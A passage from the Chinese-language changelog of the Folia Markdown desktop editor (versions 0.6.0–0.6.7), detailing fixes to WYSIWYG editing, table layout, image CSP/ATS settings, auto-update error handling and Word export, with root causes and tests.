tab-B。验收门：typecheck / lint 0 error / test 641 / build 全绿。**NOT_VERIFIED**：WKWebView 真机（atomic-replace 防抖 / dirty 安全门 / 抑制窗口）。

## [0.6.7] - 2026-08-12

### Added

### Fixed

- **修复文档/窗口切换后阅读位置重置到顶部、丢失滚动位置的问题**（#112）：根因是 Tab/Window 切换触发 CodeMirror `setValue` 或 Vditor 销毁重建，scrollTop 被重置但未按 tabId 独立保存。在 `AppLayout.tsx` 加 `Map<tabId, number>` 内存缓存 + capture 阶段 scroll 持续跟踪 + `useLayoutEffect` 同步抑制 setValue 触发的 scroll-to-0 + rAF 重试恢复。新增 `e2e/scroll-restore.spec.ts` 覆盖源码/WYSIWYG/per-tab 隔离 3 case，断言真实 scrollTop 数值（非「没崩」假阳性）。回归 mermaid-ir-renders / rich-media-cross-surface / dangerous-boundaries 全过。详见 [DEC-135](docs/DECISIONS.md)。

- **修复双击选词后首次 Backspace/Delete 或粘贴失效、第二次才正常的问题**（#113）：根因是 Vditor IR 的 click handler 每次 click 通过 `expandMarker → setSelectionFocus` 把 selection 重置为 collapsed 光标，覆盖浏览器原生「dblclick 选词」——用户视觉上词被选中，JS 选区却为空，Backspace 走光标前向删除（cursor 落在 `</p>` 末尾、首次无可见效果）。在 `WysiwygEditorPane` host 上挂 capture-phase dblclick 监听，用 `caretRangeFromPoint` 反推 click 时刻的 text node + 字符偏移、算词边界重建 selection，让 Backspace 走「删除选区」分支；不调 `preventDefault`（浏览器默认选词有效，prevent 反而阻断 BS 处理路径）。早期 wip 042df73 依赖 `target.nodeType === 3` 但 target 可能是 `<pre>/<p>` 等 element（firstChild 是 `<p>` 不是 text）会 early return，改用 `caretRangeFromPoint.startContainer` 作 text node。新增 `e2e/first-selection-action.spec.ts` 4 case（SVG sanitize / onerror / dblclick / 连续两次删除）。回归 mermaid-ir-renders / rich-media-cross-surface 全过；dangerous-boundaries 1 fail 与 main baseline 一致（既有 flake，非本 PR 引入）。本 fix 不动 ISS-69 (PR #73 `f14bcfb`) 的 `captureSelectionOffsets`——ISS-69 修的是 sanitize innerHTML 重写路径，与本 bug 是独立路径。详见 [DEC-136](docs/DECISIONS.md)。

- **修复阅读含 `http://` 图片的文章（如 RSS 订阅经镜像代理的微信图床）时图片被拦截、显示「图片协议被阻止」的问题**（#110）：根因是 `src-tauri/tauri.conf.json` 的 CSP `img-src`/`media-src` 白名单只有 `https:` 没有 `http:`，WKWebView 在浏览器层拒绝加载 http 图片、`<img>` 触发 error；`WysiwygEditorPane.tsx` 的 `classifyError` 把 `src.startsWith('http://')` 的失败归类为 `blocked-scheme`、显示「图片协议被阻止」文案（仅是 CSP 拦截后的前端诊断归类，非主动拦截）。本次在 CSP 的 `img-src` 与 `media-src` 补独立 `http:` token（图片/音视频是低风险资源；`connect-src`/`script-src`/`frame-src`/`font-src` 保持严格不放 http，与 ISS-178 一致）；同步修正 `classifyError`：http 图片失败不再误归 `blocked-scheme`（404/网络失败不再误报「图片协议被阻止」）。CSP 经 `generate_context!()` 编译期烘焙、settings 仅 `localStorage` 无 `tauri-plugin-store`，运行时开关架构上不可行，故改默认值。新增 `tauriCapabilities.test.ts` 的 `http:` 守卫；`npm test` 596/596 绿。新增 `src-tauri/Info.plist` 配 `NSAppTransportSecurity`（`NSAllowsArbitraryLoadsInWebContent` + `NSAllowsArbitraryLoads`）：macOS ATS 默认严格会二次拦截 WKWebView 的外部 http 图片，CSP 单放开不足以让图片显示，故由 Tauri bundle 合并自定义 Info.plist 放行 WKWebView 的 http（安全性由 CSP 兜底——script/connect/frame 仍严守 https/self，folia 无非 webview 的 http 请求）。`npm test` 597/597 绿（新增 CSP `http:` 守卫 + Info.plist ATS 守卫）。**真机验证（NOT_VERIFIED）**：CSP + ATS 需重新构建生效——`tauri build` 生成完整 .app 才合并 `src-tauri/Info.plist`，`tauri dev` 为 debug 裸二进制可能读不到 bundle 的 ATS，真机验证 ATS 建议用 release 构建。详见 [DEC-134](docs/DECISIONS.md)。

- **修复 Word 纸张预览与微信预览的表格列宽问题：长内容列把短内容列挤塌（与主编辑器同根因）**（#105）：PR #104 修好主编辑器与阅读预览后，Word 纸张预览（`.word-paper-content table`）与微信预览（`wechatPreviewService` 注入样式）这两个保真面仍用 `table-layout: fixed` + 单元格 `overflow-wrap: anywhere`——在「某一列内容远多于其它」的表格上（典型：Skill 清单表的长「更新要点」列），短内容列（版本、日期）同样会被挤成逐字竖排、行高极高。本次把两个面对齐 PR #104 的修复模式：`table-layout: auto`（列宽按内容自适应，长内容列获得更多宽度）+ 单元格 `word-break: normal` + `overflow-wrap: break-word`（最小宽度回到「最长词」，短列不再塌缩到 1 字宽；CJK 仍可在任意两字间断行，超长 token 真放不下时仍会断行）。保真边界：Word 纸张预览保留 ISS-182 的 `display: table !important`（对抗 Vditor `.vditor-reset table{display:block}`）；真实 DOCX 导出的列宽由 `table-handler.ts` 按网格独立计算，不受本预览规则影响；微信面 `DEFAULT_WECHAT_CSS`（预览面板样式表）与 `DEFAULT_INLINE_STYLE_RULES`（复制进公众号的内联样式）两处同步修改，保证「面板预览」与「粘贴进公众号」行为一致。真机验证（`tauri dev` dev 构建 + computer-use 驱动 WKWebView）：长内容列 + 短版本/日期列的场景表在 Word 纸张预览与微信预览中均为长内容列最宽、版本/日期单行横排不塌缩，行高正常；typecheck 干净、全量 596/596 单测绿。详见 [DEC-133](docs/DECISIONS.md)。另：排查初期观察到的「主编辑器仍塌缩」系本机安装的 v0.6.6 发布版（2026-08-05 构建，早于 PR #104 合入）所致，当前代码主编辑器渲染正常。

- **修复即时渲染编辑器标题行用左右方向键移动光标时光标短暂向后漂移一格再复位的问题**（#106）：根因是标题节点的 `# ` marker 在用户输入/方向键时被 Vditor 加 `vditor-ir__node--expand`，CSS 把 marker 从 0 宽经 150ms transition 渐变到可见宽，整段标题文本向右偏移、光标视觉向后漂移。此前的 `scheduleImmediateHeadingCollapse` 用 `requestAnimationFrame` 在下一帧移除标题 `--expand`，对「输入字符」（input 事件，Vditor 同步加 --expand）有效，但**对方向键失效**——方向键只触发 keydown + 异步 selectionchange，Vditor 是在 keydown 之后的异步 selectionchange 里才给标题加 --expand，而 RAF 注册于 keydown 同步路径、往往跑在 selectionchange 之前，此时标题尚未 --expand、RAF 移除了个寂寞，随后 selectionchange 才加 --expand 触发渐变漂移。改用 `MutationObserver` 监听 IR DOM 的 class 变化，标题节点（h1-h6）一旦被加 `vditor-ir__node--expand` 立即在其 microtask（同一渲染帧、浏览器绘制前）移除——时序无关，加/移之间无 paint，CSS transition 不触发，marker 压根不展开。保留原 RAF / 220ms timer 处理粗体/斜体等 marker（marker 在文本两侧、展开不造成光标位移，保留「输入 `**foo**` 短暂看到 `**`」的 UX）。真机验证（`tauri dev` + orca computer-use 驱动 WKWebView）：光标在标题内按方向键，截图确认 marker `#` 折叠不可见、编辑器健康不崩；详见 [DEC-132](docs/DECISIONS.md)。新增 1 项单测覆盖「标题 --expand 被立即移除」「粗体/斜体 --expand 保留（不动 UX）」。

- **修复即时渲染编辑器复制加粗等文本到外部编辑器时纯文本偶发残留 Markdown `**` 标记的问题**（#107）：根因是 Vditor IR 把 `**`/`#`/`[]()` 等 markdown 标记渲染成 `.vditor-ir__marker` span，用 `width:0;display:inline-block;overflow:hidden`（**非 `display:none`**）视觉隐藏——DOM 文本 `**` 始终存在，浏览器把选区序列化为 text/plain 时 `Selection/Range.toString()` 把这种「视觉隐藏但非 display:none」的文本带进纯文本，粘贴到外部编辑器残留字面量 `**`；marker 是否被选区边界覆盖取决于复制瞬间的选区几何（零宽 marker 边界吸附），故间歇性出现 `**AA` / `AA` 不一致。新增 host 级 `copy` 事件拦截：对当前选区 `range.cloneContents()` 得到 DocumentFragment，移除其中所有 `.vditor-ir__marker`（保留 `strong/em/a/code` 等语义标签），用清理后 fragment 的 `textContent` 作 text/plain、序列化作 text/html——纯文本干净，富文本保留加粗/斜体/链接语义，契合「纯文本 fallback 只含可见文字、富格式走 HTML」。仅处理编辑器内选区，编辑器外放行默认；`cut` 暂不在本次范围（preventDefault 会阻止默认删除，需另接删除路径，风险收益另议）。新增 1 项单测覆盖「text/plain 无 `**`、text/html 保留 `<strong>`、marker 已移除」。**真机验证边界（端到端 NOT_VERIFIED）**：orca computer hotkey 与 osascript System Events 合成的 Cmd+C 在 WKWebView 都不派发 JS copy 事件（WebKit 对合成剪贴板快捷键走原生 copy 路径、绕过 JS handler，已用 document capture 固定输出探针实测确认），故复制 handler 的端到端（真实改写系统剪贴板）须由用户用物理键盘 Cmd+C 最终确认；handler 逻辑以单测为准。详见 [DEC-132](docs/DECISIONS.md)。

- **修复 Markdown 表格列宽被强制等分、长内容列把短内容列挤成逐字竖排导致行高过高的问题**：根因是编辑器（`src/styles/app.css`）与阅读预览（`src/styles/preview.css`）的表格规则同时设了 `table-layout: fixed`，而单元格用 `overflow-wrap: anywhere`——`fixed` 把所有列强制等宽（无视内容），`anywhere` 又把单元格最小宽度降到 1 字符。在「某一列内容远多于其它」的表格上（典型：`legal-skills/README.md` 的「最近更新的 Skill」表，5 列里「更新要点」内容极长），布局协商时长内容列吞掉几乎所有宽度，把短内容列（如 Skill 列的 `multica-skill-update`）挤成逐字竖排（`m/u/l/t/i/c/a...`），行高极高。改为 `table-layout: auto`（列宽按内容自适应，长内容列获得更多宽度）+ 单元格 `overflow-wrap: break-word`、`word-break: normal`（最小宽度回到「最长词」，不再塌缩到 1 字宽；CJK 由 `normal` 在任意两字间断行，超长 token 真放不下时仍会断行）。真机验证（`tauri dev` + orca computer-use 驱动 WKWebView，详见 [DEC-131](docs/DECISIONS.md)）：同一张「最近更新的 Skill」表，Skill 列链接由逐字竖排恢复为横向一行显示，「更新要点」列合理最宽（约 40-50%），行高正常。Word 纸张预览（`.word-paper-content table`，ISS-182 保真面）与微信预览（`wechatPreviewService` 注入 CSS）存在同根因，但属不同保真面、各有保真测试，本期未改，留作后续。同一次排查的另外两个问题（`<details>` 折叠失效、二维码不渲染）结论见 [DEC-131](docs/DECISIONS.md)：前者为 Vditor IR 已知限制（记为限制不强行修），后者在当前 main 已正常渲染（用户报告大概率来自早于 v0.6.3 的旧发布版）。

## [0.6.6] - 2026-08-05

### Added

### Fixed

- **修复自动更新下载超时后点击「重试」时进度交错回退（如 `1% → 22% → 2% → 23%`）的问题**（ISS-99）：根因是 Tauri updater 的 `update.download(onEvent)` **没有取消参数**，超时/重试后旧下载尝试的 `onProgress` 回调仍挂在跑着的 Rust 下载流上，继续往同一个 `downloading` state 写进度；而 ISS-72 引入的三道守卫（abort 信号 / phase / version）在同版本重试时**全部失效**——旧尝试的 `AbortController` 在 `.finally` 里被置 null 后重试无法 abort、重试把 phase 重置回 `downloading`、version 守卫无法区分同版本（如 0.6.5）的两次尝试。现引入**单调递增的 per-attempt 令牌**（`updateAttemptRef`），新尝试（含重试）`++` 使旧令牌失效，旧尝试的 `onProgress` / `.then` / `.catch` 见到令牌不再匹配即丢弃事件，UI 只展示当前有效尝试的单调进度。新增 1 项 AppLayout 集成回归测试：mock 两次 `downloadAppUpdate`（attempt#1 发 10% 后挂起、attempt#2 发 1%/2%），超时 → 重试后故意触发 attempt#1 的陈旧 22% 事件，断言界面仍为「下载中 2%」且不出现「下载中 22%」（修复前该断言失败）。**已知残留**：Tauri 插件 API 不支持中途取消 `update.download()`，且重试复用同一 `Update` 对象（`close()` 会连带废掉重试），故旧 Rust 下载流会静默跑到自然结束、有短暂额外带宽，但不影响 UI 正确性；彻底取消需重试时重新 `check()` + close 旧 Update，属更大改动，本期不做。真机精确复现需可控的下载中途超时 + 待下载更新源（当前已处于目标版本），无法稳定触发，行为以集成测试为准（见 `project-folia-realapp-verify`：Folia WKWebView 交互无法用 orca click 驱动，web 交互走真实组件单测）。

## [0.6.5] - 2026-08-04

### Added

- **文件标签右键菜单增加「在文件管理器中显示」，并在地址栏增加常驻「复制路径」图标**（#85）：1）右键任意已保存文件标签 → 菜单顶部新增「在文件管理器中显示」（macOS 打开访达、Windows 打开资源管理器，并选中该文件），用分隔线与下方「关闭 / 关闭其他 / 关闭右侧 / 全部关闭」分组；点击调用 `@tauri-apps/plugin-opener` 的 `revealItemInDir`（权限 `opener:default` 已覆盖，无需改 capabilities）。文案平台中立（不写死 Finder，因 Windows 是发布目标）。未保存的新建标签或路径已失效时不渲染该项（沿用既有 `isPlaceholder`「不适用即隐藏」约定，保持菜单精简）；`revealItemInDir` 失败（如点击瞬间文件被删的竞态）吞掉异常仅 warn，避免 unhandled rejection。复用现有 `ContextMenu` props 驱动 + i18n（中 / 英 / 日）。2）Issue 另一诉求「复制文件路径」未加入菜单——底栏地址栏本就支持（双击路径即复制），故改为在地址栏新增一个常驻 lucide 复制小图标（单击复制完整路径，沿用现有「已复制 / 复制失败」反馈），解决原「仅双击 + 仅 hover tooltip」可发现性偏弱的问题；双击复制与 tooltip 保留。新增 `fileLocationService`（含浏览器预览下的静默降级）+ 5 项 ContextMenu 单测 + 2 项 StatusBar 单测 + 3 项 fileLocationService 单测。

### Fixed

- **修复点击标签栏右上角「+」新建标签后进入空白编辑器、而非欢迎引导页的问题**（ISS-88）：TabBar「+」此前与欢迎页内「新建」按钮共用 `session.openInNewTab(createEmptyFile())`——`openInNewTab` 在当前 active 为干净占位标签（欢迎页）时会替换它以避免占位累积，但替换出的新标签走 `makeTabFromFile(file)` 未传 `isPlaceholder`，默认 `false`，于是占位标签（欢迎页）被替换成「真实空 tab」，`showHomePage`（`= activeTab.isPlaceholder`）翻转为 `false`，欢迎页消失、退化为无内容的空白 `WysiwygEditorPane`，「+」失去对窗口的意义。现新增专用 `newBlankTab` action：TabBar「+」改为新增一个占位标签（`isPlaceholder=true`，欢迎页状态），不替换当前 placeholder，与 `openInNewTab`（打开文件 / 欢迎页「新建」进入编辑器）语义分离；欢迎页「新建」按钮行为不变（仍进入编辑器开始写）。新增 3 项 reducer 单测覆盖「非占位 active 新增」「占位 active 也新增不替换（核心场景）」「超 MAX_TABS 的 LRU」，以及 2 项 E2E 覆盖「欢迎页点 + 仍停留欢迎页」「编辑中点 + 新增欢迎页且原标签可切回」。顺带修正 `e2e/layout-behavior.spec.ts` 的 `openEditor` helper：此前它借点 TabBar「+」（aria-label「新建文件」）从欢迎页进入编辑器，现改点欢迎页内「新建」按钮（`.recent-page-secondary`）。
- **修复点击「检查更新」失败时界面直接暴露底层英文错误 `error sending request for url (...)` 的问题**（ISS-84）：在 `0.6.4` 中，手动「检查更新」走的是 `updateService.toErrorMessage`，它把 Tauri updater（reqwest）抛出的原始 `error.message` 原样透传给界面，而 ISS-72 的本地化文案只覆盖了下载路径（`AppLayout.toUpdateErrorMessage`），两条路径各维护一份错误映射逻辑。现在抽取共享的 `categorizeUpdateError`（手动检查 / 自动检查 / 后台下载三条路径共用），并扩展正则以识别 reqwest 的 `error sending request for url (...)` / `request failed` / `trying to connect` / `dns` 等传输层错误文案（旧正则不含这些关键词，会落到 generic 分支把英文原文嵌入 `更新失败：{message}`）。检查失败统一映射为中文「检查更新失败：无法连接更新服务器，请检查网络后重试。」（网络/超时）或「检查更新失败，请稍后重试。」（其它），中 / 英 / 日三语，绝不再向用户暴露 `error sending request` 原文；「检查更新」按钮本身即重试入口。新增 `categorizeUpdateError` 单测（含 #84 的精确 reqwest 错误串）与 `AboutSection` 行为回归测试（点击真实按钮 + 喂入 issue 原始错误串，断言中文文案出现、英文原文不出现）。
- **修复 Gitee 备用更新端点自 ISS-72 起一直 404、fallback 从未真正生效的问题**（ISS-84）：ISS-72 在 `tauri.conf.json` 加入 Gitee fallback 时误用了 GitHub 的关键字别名形式 `/releases/latest/download/latest.json`，并试图用「建一个名为 `latest` 的 tag」让它生效——但 Gitee 根本不解析 `/releases/latest/download/` 这条路径（既不是别名，同名 tag 也救不了，因为 Gitee 的资产直链形式是 `/releases/download/{tag}/{file}`，download 在 tag 之前）。实测 GitHub 不可达时 fallback 直接 404，整条备用链路从未工作。一个早期版本曾识别过此问题并把 Gitee 移出客户端 endpoint，但 ISS-72 又以同样的错误 URL 重新引入。现改为正确的 Gitee 直链 `/releases/download/latest/latest.json`（实测返回 HTTP 200 + 有效 manifest，含 darwin-aarch64/darwin-x86_64/windows-x86_64 三平台且下载 URL 指向 gitee.com）；CI 上传逻辑不变（仍由 release.yml「Sync latest manifest to fixed Gitee tag」把 manifest 挂到固定 `latest` tag）。同步修正 `release.yml` 误导性注释与 `docs/ARCHITECTURE.md` 中已过时的「Gitee 不写入客户端 endpoint」表述。

## [0.6.4] - 2026-07-31

### Added

- **关闭未保存文档或退出应用时增加保存确认**（#68 / DEC-130）：当文档存在未保存修改时，关闭标签、关闭窗口或退出应用（Cmd+Q / 红绿灯 / 窗口 X）前会先弹出三选项确认框——「保存」（保存后继续关闭）、「不保存」（放弃修改关闭）、「取消」（返回编辑器）；文档已保存时直接关闭不打扰。退出应用时若有多个未保存标签，会逐个确认，中途取消任一个即终止退出。原有原生 `window.confirm` 的单标签关闭确认也一并升级为该三选项对话框，并补齐中 / 英 / 日三语文案。窗口关闭拦截走 Rust `prevent_close` + 事件方案，避免此前前端 `onCloseRequested` 在 macOS 上的误拦截问题；程序化关闭路径（merge-back、确认后关闭）改走 `destroy()` 绕过拦截。Issue 列出的「批量关闭」「切换文档替换编辑内容」两个场景留作后续。

### Fixed

- **修复单列 Markdown 表格导出 Word 时被降级为普通段落的问题**（ISS-77）：单列表格（`| 单列 |` / `| --- |` / `| 值 |`）导出 DOCX 时，管道符 `|`、分隔线 `---` 及各行内容会作为普通文本散落在文档里，未生成真实 Word 表格。根因是 `isMarkdownTableRow` / `isMarkdownSeparator` 此前要求 `splitMarkdownRow(line).length >= 2`——而 `splitMarkdownRow` 在两端有 `|` 时会 shift/pop 掉两个空 cell，单列情况切完只剩 1 个有效 cell，被门槛拦掉，进而走普通段落分支。修复后门槛降到 `>= 1`，单列表格可正常识别为 Word 表格；单独的 `|` 字符经 shift/pop 后得空数组（长度 0）仍不会误判。新增 7 项单测覆盖单列表/多列表/段落中间夹单列表及各种对齐标记（`:---` / `:---:` / `---:`）。
- **修复二级标题（含 h1-h6）编辑时输入英文字符会生成并保留字面量 `****` 的问题**（ISS-75）：在 WYSIWYG（Vditor IR）模式下编辑带加粗的标题时，只要在标题文字中插入英文字符，标题中会生成并保留多余的字面量 `****`，编辑器 / 预览 / 导出三方都会显示 `致：XXX****市场监督管理局` 这种字面星号。根因是 Vditor IR 模式在标题节点的 `<span data-type="strong">` 内层 `<strong>` 文本里偶发残留 `****`（典型来源：用户在加粗标题中点入光标触发 bold split、保存/重载时 Lute 解析 `**xxx**...**yyy**` 相邻空 bold 的退化形式等），Lute.VditorIRDOM2Md 在 round-trip 时原样保留。修复后：`sanitizeVditorIrHtml` 新增 `repairBrokenStrongMarkers` 步骤，对同时具备「开闭 `vditor-ir__marker--bi` marker span + 内层 `<strong>`」完整 IR 强语义结构（不包含裸 `<strong>` 用户内容）剥离内层文本里的字面量 `****`，并触发 `securityChanged=true` 让父组件用修复后的 HTML 写回 IR DOM，避免 Vditor 持有脏状态继续产出 `****`。新增 5 项 service 单测覆盖 h1-h6 各层级、正常 strong 幂等、用户裸 `<strong>` 不被误伤、id/data-folia-toc-anchor 等外属性保留，以及完整 round-trip 回正确 MD。
- **修复自动更新长时间停留在"正在后台下载"且无进度或错误提示的问题**（ISS-72）：根因是 `AppLayout.startBackgroundUpdateDownload` 调用 `downloadAppUpdate(update.update)` 时**未传 `onProgress` 回调**——Tauri Channel 的 `Started/Progress/Finished` 事件全部丢失，且整个下载路径没有任何超时保护，一旦 Rust 端下载命令挂起（网络 chunk timeout 未触发、Channel 漏发 Finished 等已知问题），前端永远停留在 `'downloading'` 阶段。修复后：1）传入 `onProgress`，让下载进度进入 React 状态机；2）下载路径加入 5 分钟绝对超时，超时后强制切到 `error` 状态；3）错误信息按 Rust 端 `error.message` 分类（超时/网络/签名校验/安装/通用）映射成本地化文案（zh/en/ja 三语）；4）Toolbar 在下载中阶段显示「下载中 N%」+ spinner，用户随时能看到进度；5）关于页面文案响应真实 phase（`checking / downloading N% / ready / error`），不再是写死的"正在后台下载"；6）下载失败时关于页面与 Toolbar 均出现「重试下载」按钮，无需重启 App；7）自动检查更新开关从 `useRef` 改为 `useState`，关闭再打开能重新触发检查；8）`translate()` 函数新增 `params?` 占位符支持，顺带让此前不生效的 `{count}` 占位符真正可用。新增 2 项 service 单测与 5 项 AppLayout 单测覆盖进度回调、超时、错误本地化、重试入口和重入防护。
- **修复粘贴带标题格式的文本时保留源格式并出现异常跳行的问题**（ISS-67）：在 WYSIWYG（Vditor IR）模式下，从浏览器、Word 等复制含 `## 二级标题` 等块级格式的内容后，普通 `Cmd/Ctrl+V` 会按源格式（HTML）粘贴——Vditor 用 Lute 把 `<h2>` 转成独立块级元素，光标停在正文中间时会把当前段落「撑开」，产生异常换行/跳行。现在普通粘贴强制按剪贴板 `text/plain` 插入（`insertValue(text, false)` 不重新渲染 markdown），保留当前段落结构；需要保留源格式时用 `Cmd/Ctrl+Shift+V` 粘贴富文本。图片粘贴与拖拽路径不变。`text/plain` 为空（如仅有 HTML）时仍放行默认行为，避免误吃粘贴。
- **修复编辑器选中文字后按 Backspace/Delete 偶发未生效的问题**（ISS-69）：在 WYSIWYG（Vditor IR）模式下，删除选中文本后界面短暂闪烁、文字恢复、光标回到原位置。根因是 `sanitizeIrDom` 的触发条件仅看 `changed`（任何字节级差异），DOMPurify / 浏览器 HTML parser 的序列化规范化（属性顺序、SVG 属性大小写、自闭合标签、空白等）会让 IR DOM 被整体重写，摧毁 Selection 并经 `onChange → 父 source → useEffect → setValue` 反馈环路恢复原文。修复后：1）`sanitizeVditorIrHtml` 新增 `securityChanged` 字段，仅在确实剥除危险节点/属性/URI 时才整体重写 IR DOM；2）判定机制用结构化 DOM 差异对比（sanitize 前后节点/属性总数），不再依赖危险特征黑名单，覆盖 srcset / poster 等黑名单遗漏的 fail-open 场景；3）`sanitizeIrDom` 在整体重写前后用文本偏移快照保留 Selection；4）`input()` 回调仅在 `securityChanged` 时才用 `editor.getValue()` 覆盖 callback 参数，避免父组件反馈。新增 service 单测覆盖纯文本 / 仅序列化 / 真剥除三类场景，含 srcset / poster 的 fail-open 回归保护。
- **修复内置 Word 模板导出时标题出现非预期蓝色（2E74B5 / 1F4D78）的问题**（ISS-78）：根因是 docx 库默认 Heading1–6 样式在 `styles.xml` 内嵌 `<w:color w:val="2E74B5"/>` / `<w:color w:val="1F4D78"/>`，而内置预设未在 run 级显式声明 headings 颜色——run 缺少 `<w:color>` 时会被 Word 按样式继承，结果未指定颜色的文档在 Word 中打开时所有标题都以蓝色显示，与源文档及法务/学术预期明显不符。现在 4 个内置预设（legal / academic / report / minimal）的 `fonts.default.color` 与 `titles.level1–6.color` 都显式声明为 `000000`（minimal 的 level1/level2 在 `...legal.titles` spread 之后曾因 override 丢失 color，本期同时显式补回，避免依赖 formatter 跨级 `?? color` 兜底），formatter 在 run 级写入 `<w:color w:val="000000"/>` 覆盖 docx 库默认颜色，标题与正文恢复稳定统一的黑色。超链接不受影响，仍为 `0563C1`；需要自定义强调色时直接在预设 JSON 中覆盖对应字段即可。新增 docxXml 单测覆盖全部 4 个预设，断言 run 级不出现 `2E74B5` / `1F4D78`、至少 7 个黑色 `000000`、且超链接蓝色 `0563C1` 仍保留。
- **修复标题行在编辑器中逐字删除或方向键移动时光标视觉短暂向后漂移的问题**（ISS-76）：在 WYSIWYG（Vditor IR）模式下，对标题行（`# 标题` 等）执行 Backspace/Delete 或左/右方向键时，光标会瞬时跳到「待删除/待移动字符的再下一字符」之后再复位，体感为明显的瞬时跳动或闪烁。根因是 Vditor IR 模式把 markdown marker（`# `）渲染为标题节点内的 `<span class="vditor-ir__marker--heading">`，折叠态由 CSS 设为 `width:0`（不可见），用户交互时 Vditor 给当前标题节点加 `vditor-ir__node--expand` 把 marker 从 0 宽渐变到可见宽（150ms CSS transition），整段标题文本向右偏移，光标视觉位置向后漂移一格；原 `IR_MARKER_COLLAPSE_DELAY_MS=220` 要 220ms 后才回退 --expand，光标视觉随后复位。粗体/斜体的 `**` 在文本两侧（`**foo**`），展开不偏移光标，仍按 220ms 折叠保留「输入时短暂显示 markdown 语法」的 UX。新增 `scheduleImmediateHeadingCollapse` helper，对 `h1-h6.vditor-ir__node--expand` 走 `requestAnimationFrame` 立即回退（绕开 CSS 渐变中间态），从 `input()` 与 `keydown()` 回调两路调用，覆盖 Backspace/Delete 与方向键场景；其它 marker 类型维持 220ms timer 行为不变。新增 2 项 WysiwygEditorPane 单测断言下一帧内标题节点 `--expand` 被移除、粗体/斜体节点仍按 220ms 折叠。
- **ISS-75 / ISS-76 review follow-up（代码质量收尾）**：1）ISS-76——`scheduleImmediateHeadingCollapse` 注册的 `requestAnimationFrame` 此前没有卸载竞态防护，组件卸载后 RAF 仍可能触发并操作已 destroy 的编辑器 DOM；现给函数新增 `cancelled: () => boolean` 参数，RAF 回调首行检查短路，两处调用（`input()` / `keydown()`）传入 init effect 闭包的 `cancelled` 标志 getter，与文件内其它 RAF 调用点的卸载防护模式一致。2）ISS-75——`repairBrokenStrongMarkers` 的 docblock 补充语义取舍说明（IR strong 结构内的 `****` 一律视为 Vditor 边界残留而非用户字面量，真要写字面星号走裸 `<strong>` / 代码块 / 转义），并新增 1 项锁定测试断言「合法 IR strong 内层故意写 `****` 也会被剥」，防止后人误以为是 bug 又来改。

## [0.6.3] - 2026-07-30

### Fixed

- **修复跨父目录的本地相对路径图片在 WYSIWYG 中只显示替代文字的问题**（ISS-187 / DEC-129）：Vditor 的后处理清洗会移除已经转换好的 Tauri `asset:` 图片地址，但保留原始 Markdown 链接标记，导致 `../../figures/...` 这类合法路径在 Obsidian 可见、在 Folia 中丢失。现在会从 Vditor IR 标记恢复原始相对地址，重新经过现有本地资源解析与敏感路径检查后生成可加载 URL；同时监听 Vditor 初始化、外部 `setValue()` 和清洗引起的媒体节点替换。未通过全局放行 `asset:` 或扩大资源 scope 绕过安全边界。

## [0.6.2] - 2026-07-28

### Changed

- **移除工具栏「插入法律文档模板」按钮**（DEC-126）：v0.6.0 在「显示源文件」左侧新增的「插入模板」按钮（ClipboardList 图标）经真机使用反馈冗余——法律文档模板入口对日常 Markdown 阅读场景非必需，且首页未打开文件时以禁用态占位，被感知为「多出来的按钮」。现移除该按钮及其下拉菜单、CustomEvent 接线（Toolbar 派发 + WysiwygEditorPane 监听）、`.toolbar-template-*` CSS 与三语 `toolbarInsertTemplate*` i18n key；模板源数据 `src/services/legalTemplates.ts` 保留备用，未来需要时可重新接回。工具栏回到「打开 / 保存 / 另存 / 源码 / Word 预览 / HTML 预览 / 设置」简洁布局。

### Fixed

- **修复长文章点击侧边 TOC 后跳到错误标题或长时间停在中间位置的问题**（ISS-186 / DEC-128）：TOC、源码模式和 WYSIWYG 跳转改为共用 `tocService` 标题模型；解析器按行识别 Markdown ATX 标题并排除 fenced code 中的 `#` 示例，DOM 绑定只选择 Vditor 的真实 Markdown 标题、排除 HTML / 图表预览标题，并为重复标题按顺序绑定独立 `toc-N` 锚点。超过约 1.5 个编辑器视口的跳转改为即时定位，近距离仍保留短平滑、同时尊重“减少动态效果”。新增单元测试与 30 节长文逐像素 E2E，覆盖反引号 / 波浪线围栏、HTML heading、重复标题、源码位置和远距离跳转。
- **修复设置页栏目切换时内容区闪一下的问题**（ISS-185 / DEC-127）：非默认栏目继续按需加载，但点击后不再立即卸载当前内容、显示 `SectionFallback`；左侧选中态立即响应，右侧通过 deferred section 保留上一栏目，目标 chunk 就绪后一次性提交新内容。鼠标移入、键盘聚焦和点击栏目时会主动预热对应 chunk，不增加应用首屏静态包。新增延迟 EditorSection chunk 的逐帧 E2E，断言加载期间旧「通用」内容始终可见、`.settings-section-loading` 全程 0 帧，随后只切换为真实「编辑器」内容。

## [0.6.1] - 2026-07-28

### Fixed

- **统一应用图标视觉尺寸**：Folia 的源图标此前铺满 ICNS 画布，导致 Finder 中的白色圆角图标比 WorkBuddy 等 macOS 应用大一轮。现为整张图标补入约 10% 的透明安全边距，并重新生成 macOS ICNS、Windows ICO 及 Tauri 桌面图标尺寸；设置页使用的本地图标同步更新。
- **ISS-180 设置页首次打开白屏真正闭合**（DEC-124 决策 3 / 4）：v0.6.0 同时修复了内层 `GeneralSection` Suspense 与入口 `preloadSettingsPage().then(...)`，但 `SettingsPage` 自身仍是外层 `React.lazy`，React 首次真正渲染时仍先提交一次 `<Suspense fallback>` —— 即便 import Promise 已完成，肉眼仍可见约 302ms 的低对比骨架。现把 `SettingsPage` 外壳从外层 `React.lazy` 改为静态导入，剥掉外层 `<Suspense fallback>`；`GeneralSection` 保留静态导入，7 个非默认 section 仍按需 lazy（保留切换 tab 的 "正在加载" 过渡）。`Cmd+,` 与工具栏「设置」两条入口直接 `setSettingsVisible(true)` 并并行预热非默认 section。E2E 按 DEC-124 决策 4 重写为首帧非 fallback 契约：MutationObserver 截 `.settings-overlay` 首次出现那一帧，断言 `.settings-modal-skeleton` 0 帧、真实「设置 / 通用 / 4 行控件 / 8 nav」同帧齐备。ISS-152 用例新增 `settings-modal-skeleton=0` 断言；ISS-153 删掉旧的 skeleton 等待。

## [0.6.0] - 2026-07-26

### Added

- **法律文档模板**（v0.7，ROADMAP）：工具栏新增「插入模板」按钮，可一键在光标处插入证据目录、诉讼材料清单、案件时间线三类法律文档骨架。模板使用 Markdown 管道表格与列表（可编辑、可增删行列），而非会被锁定为只读的复杂 HTML 合并表；内容是精简骨架（表头 + 占位空行），供用户填充而非删除。三语界面文案同步。
